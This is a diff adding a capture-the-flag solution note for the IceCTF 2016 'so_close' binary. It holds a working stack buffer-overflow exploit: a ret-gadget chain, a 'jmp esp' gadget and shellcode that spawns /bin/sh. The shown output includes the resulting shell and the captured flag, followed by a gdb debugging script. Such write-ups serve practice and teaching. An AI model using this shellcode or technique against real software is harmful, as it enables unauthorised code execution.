@@ -1,0 +1,25 @@
+# We partially override EBP with \x0a (the original value was 0xffffdbe8)
+
+[ctf-96789@icectf-shell-2016 ~]$ (python -c 'from struct import pack; from sys import stdout; stdout.write( "A" * 26 + pack("I", 0x080484b5) * 48 + pack("I", 0x0804859f) + "\x6A\x31\x58\xCD\x80\x89\xC3\x89\xC1\x6A\x46\x58\xCD\x80\x31\xC0\x31\xD2\x50\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" + "\x00" * 7 + "\x0a" )'; cat - ) | /home/so_close/so_close
+something something something..
+id
+uid=1922(ctf-96789) gid=1003(ctf) egid=1008(so_close) groups=1008(so_close),1003(ctf)
+cat /home/so_close/flag.txt
+IceCTF{eeeeeeee_bbbbbbbbb_pppppppp_woooooo}
+
+# For the debugging purposes:
+$ cat gdb.script
+set disassembly-flavor intel
+display /i $eip
+set confirm off
+b *0x08048472
+b *0x08048485
+r <<< $(cat pwn)
+
+$ gdb -x gdb.script ./so_close
+
+(gdb) x /i 0x080484b5
+   0x80484b5 <main+46>: ret
+
+(gdb) x /i 0x0804859f
+   0x804859f:   jmp    esp
